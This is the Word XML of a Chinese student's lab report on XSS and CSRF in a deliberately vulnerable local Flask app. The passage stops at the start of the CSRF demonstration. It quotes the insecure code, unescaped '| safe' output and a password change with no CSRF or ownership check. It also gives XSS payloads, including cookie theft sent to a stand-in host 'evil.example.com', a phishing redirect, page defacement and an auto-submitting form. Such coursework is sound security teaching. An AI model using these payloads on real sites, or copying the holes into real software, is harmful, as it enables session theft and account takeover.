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大二实训Day7：XSS与CSRF漏洞实验报告</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>姓名：敬君琳    学院：网络空间安全学院    专业：网络空间安全    学号：2024141530063</w:t>
        <w:br/>
        <w:t>实验日期：2026年7月24日    指导老师：陈腾    实验名称：XSS跨站脚本攻击与CSRF跨站请求伪造漏洞分析与利用</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>了解XSS（跨站脚本攻击）的基本概念、分类（反射型XSS、存储型XSS、DOM型XSS）及危害。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>掌握CSRF（跨站请求伪造）的攻击原理和利用方式。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>通过在留言板中插入恶意脚本，理解存储型XSS的攻击流程。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>通过在反馈功能中构造恶意URL参数，理解反射型XSS的攻击流程。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>通过构造恶意页面诱导用户点击，实现对密码修改功能的CSRF攻击。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>学习XSS和CSRF漏洞的修复方案，包括输出编码、CSRF Token、SameSite Cookie等防护措施。</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>二、实验环境</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>操作系统：Windows 11 Pro</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>开发语言：Python 3.x + Flask框架</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>数据库：SQLite 3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>开发工具：Visual Studio Code</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>测试工具：Burp Suite Community / Chrome DevTools</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>浏览器：Google Chrome</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>端口：5000（Flask本地服务）</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>三、Day7 新增功能</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>3.1 功能概览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路由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方法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修改密码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`/change-password`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使用用户名和新密码修改密码（存在CSRF漏洞）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留言板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`/post-comment`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用户发表留言并展示所有留言（存在存储型XSS漏洞）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意见反馈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`/feedback`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用户提交反馈并回显内容（存在反射型XSS漏洞）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数据库扩展</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>在原有 users 表基础上新增了 comments 表：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comments 表结构</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24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约束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PRIMARY KEY AUTOINCREMENT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created_at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项目文件结构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Day7/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app.py                     # Flask 主程序（含XSS和CSRF漏洞）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data/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└── users.db               # SQLite 数据库（自动生成）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pages/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└── help.html              # 帮助中心页面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templates/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base.html              # 基础模板（导航栏新增反馈入口）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index.html             # 首页（新增留言板和反馈回显区域）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login.html             # 登录页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register.html          # 注册页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upload.html            # 文件上传页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└── profile.html           # 个人中心（新增修改密码表单）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└── static/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└── css/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└── style.css          # 样式文件（新增留言板、反馈样式）</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>四、漏洞一：存储型XSS（Stored XSS）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>4.1 漏洞原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>存储型XSS是指攻击者将恶意脚本提交到Web应用程序的数据库中，当其他用户访问包含该数据的页面时，恶意脚本从数据库中取出并在用户浏览器中执行。这种攻击方式影响范围最广，所有访问该页面的用户都可能成为受害者。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>4.2 漏洞代码分析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留言板提交接口（app.py 第259行）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>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@app.route("/post-comment",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post_comment():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username = session.get("username")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not username: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redirect("/login")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content = request.form.get("content",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直接将用户输入的 content 原样存入数据库，不做任何过滤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content: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cursor.execute(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    "INSERT INTO comments (username, content, created_at) VALUES (?, ?, ?)",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    (username, content, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))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return redirect("/")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留言显示模板（templates/index.html）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>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漏洞关键：使用 | safe 过滤器，Flask不会对输出做HTML转义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&lt;div class="comment-content"&gt;{{ comment.content | safe }}&lt;/div&gt;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漏洞分析</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>留言内容和显示这两个环节分别存在不同的问题。存入时没有对用户输入做任何过滤，取出时使用Jinja2的 `| safe` 过滤器让内容原样输出。Jinja2模板引擎默认会对 `{{ }}` 中的内容进行HTML实体编码（例如 `&lt;` 会变成 `&amp;lt;`），但 `| safe` 标记告诉Flask"这个内容是安全的，不需要编码"，于是 `&lt;script&gt;` 标签就会直接被浏览器解析执行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>因此，攻击者在留言板提交的HTML/JavaScript代码会被浏览器当作页面的合法部分来执行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>4.3 攻击演示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攻击场景一：弹窗测试</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>以用户alice登录后，在留言板输入框中提交：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&lt;script&gt;alert('XSS攻击测试')&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>点击"发表"后，留言被存储到数据库中。任何用户在访问首页时，浏览器都会解析并执行这段脚本，弹出一个警告框。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攻击场景二：Cookie窃取</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>攻击者在留言板中提交：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var img = new Image();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img.src = 'http://evil.example.com/steal?cookie=' + document.cookie;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&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>当其他用户（包括管理员admin）访问首页时，脚本会自动将当前用户的Cookie发送到攻击者的服务器。攻击者拿到Cookie后可以伪造用户身份登录系统。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攻击场景三：页面重定向</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24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&lt;script&gt;window.location.href='http://evil.example.com/phishing'&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>用户访问首页后自动跳转到钓鱼网站，攻击者可以仿造登录页面诱导用户输入凭证。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攻击场景四：页面篡改</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24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document.body.innerHTML = '&lt;h1&gt;此网站已被黑&lt;/h1&gt;';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&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>访问后整个页面内容被替换，系统无法正常使用，影响所有用户的体验。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>4.4 攻击影响分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>存储型XSS攻击一旦成功，可以实现以下危害：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>窃取其他用户的Cookie或Session信息，冒充其他用户身份（包括管理员）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>篡改页面内容，发布虚假信息或钓鱼表单</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>记录用户的键盘输入（键盘记录器）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>利用受害者的浏览器对系统发起CSRF攻击</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>将用户重定向到恶意网站</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>在受害者浏览器中运行挖矿脚本</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>由于留言内容是持久化存储的，每一次页面刷新或任何用户访问首页，恶意脚本都会重新执行一次，所以危害范围极大、持续时间很长。</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>五、漏洞二：反射型XSS（Reflected XSS）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>5.1 漏洞原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>反射型XSS是指恶意脚本通过URL参数或表单提交，被服务器直接"反射"回响应页面中，浏览器解析页面时执行该脚本。这种攻击通常需要攻击者诱导用户点击特制的链接，属于一次性的攻击。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>5.2 漏洞代码分析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反馈接口（app.py 第274行）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>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@app.route("/feedback", methods=["GET", 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feedback():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request.method == "POST":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feedback_msg = request.form.get("message",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# 直接将用户输入回显给模板，不做任何过滤或转义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echo_content = feedback_msg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GET方式也支持回显（/feedback?q=xxx）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search_query = request.args.get("q",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return render_template(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"index.html",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user=user_info,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feedback_msg=feedback_msg,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echo_content=echo_content,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search_query=search_query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)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模板回显（templates/index.html）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>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漏洞：使用 | safe 过滤器，不对用户输入做HTML转义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&lt;div class="comment-content"&gt;{{ echo_content | safe }}&lt;/div&gt;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&lt;div class="comment-content"&gt;{{ search_query | safe }}&lt;/div&gt;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漏洞分析</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>：用户提交的反馈内容或URL参数被直接回显到页面中，且使用了 `| safe` 标记。Jinja2默认会对 `{{ }}` 输出进行HTML实体编码（`&lt;` 会变成 `&amp;lt;`），从而阻止脚本执行。但在代码中刻意使用了 `| safe` 过滤器跳过了这个保护机制。攻击者可以构造一个带有恶意脚本的URL，将这个链接发送给受害者。当受害者点击链接时，恶意脚本在其浏览器中执行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>5.3 攻击演示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攻击场景一：GET方式回显弹窗</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>构造恶意URL并诱导受害者点击：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http://127.0.0.1:5000/feedback?q=&lt;script&gt;alert('反射型XSS')&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>受害者点击此链接后，`&lt;script&gt;alert('反射型XSS')&lt;/script&gt;` 被服务器回显到页面中且未被转义，浏览器解析页面时执行了弹窗。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攻击场景二：Cookie窃取链接</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24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http://127.0.0.1:5000/feedback?q=&lt;script&gt;new Image().src='http://evil.example.com/steal?c='+document.cookie&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>诱导受害者点击或在其他网站的iframe中加载此URL，受害者的Cookie会被发送到攻击者服务器。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攻击场景三：POST方式反射</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>攻击者构造一个恶意网页，其中包含一个自动提交的表单：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&lt;html&gt;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&lt;body onload="document.forms[0].submit()"&gt;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&lt;form action="http://127.0.0.1:5000/feedback" method="POST"&gt;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&lt;input name="message" value="&lt;script&gt;alert(document.cookie)&lt;/script&gt;"&gt;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&lt;/form&gt;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&lt;/body&gt;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&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>受害者访问这个恶意页面后，表单自动提交，脚本在受害者浏览器中反射执行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>5.4 反射型XSS与存储型XSS对比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对比项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存储型XSS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反射型XSS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恶意脚本存储位置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存储在服务器数据库中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在URL参数或表单中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触发方式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任何人访问页面即触发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需要诱导用户点击特制链接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持久性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持久存在，直到数据被删除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一次性，仅单次请求有效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攻击范围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所有访问该页面的用户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只有点击了恶意链接的用户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攻击难度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高（需要找到输入点和输出点）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中（需要社会工程学配合）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留言板、评论区、用户资料页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搜索框、错误提示、反馈页</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>六、漏洞三：CSRF（Cross-Site Request Forgery）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>6.1 漏洞原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>CSRF（跨站请求伪造）是指攻击者诱导用户访问一个恶意页面，该页面在用户不知情的情况下，以用户的身份向目标网站发送请求。由于浏览器会自动携带目标网站的Cookie，服务端会认为这是一个合法的用户操作。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>6.2 密码修改接口分析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修改密码路由（app.py 第273行）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>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@app.route("/change-password",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change_password():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只检查是否登录，不检查其他任何内容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username = session.get("username")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not username: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redirect("/login")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target_username = request.form.get("username",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new_password = request.form.get("new_password",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直接更新密码，不验证原密码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不校验当前登录用户是否有权限修改目标用户的密码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hashed_pw = generate_password_hash(new_password)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更新内存中的 USERS 字典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target_username in USERS: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USERS[target_username]["password"] = hashed_pw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更新数据库中的密码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cursor.execute(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"UPDATE users SET password = ? WHERE username = ?",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(hashed_pw, target_username)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return redirect("/profile")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漏洞特征（全部命中）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sz w:val="24"/>
        </w:rPr>
        <w:t>未使用 CSRF Token 验证请求来源</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>不需要验证原密码即可修改</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>不校验 session 中的用户和表单提交的 username 是否一致（任意用户可改任意人密码）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>不检查 Referer/Origin 请求头</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>修改成功后没有安全提示，直接重定向</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>6.3 攻击演示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攻击场景一：CSRF修改admin密码</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
